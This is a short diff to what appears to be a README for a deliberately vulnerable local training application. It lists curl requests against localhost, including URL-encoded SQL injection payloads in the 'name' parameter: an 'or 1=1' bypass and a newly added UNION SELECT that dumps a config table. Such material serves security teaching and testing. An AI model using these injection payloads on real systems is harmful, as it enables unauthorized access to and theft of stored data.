@@ -4,6 +4,7 @@
 ```bash
 curl http://localhost:8080/vun/sql/example1/api/users?name=michal
 curl http://localhost:8080/vun/sql/example1/api/users?name=michal%27%20or%201=1%20--%20-
+curl http://localhost:8080/vun/sql/example1/api/users?name=michal%27%20UNION%20SELECT%20%2A%20FROM%20config%20%2D%2D%20%2D
 ```
 
 ## POST request - Get list of users - filter in body
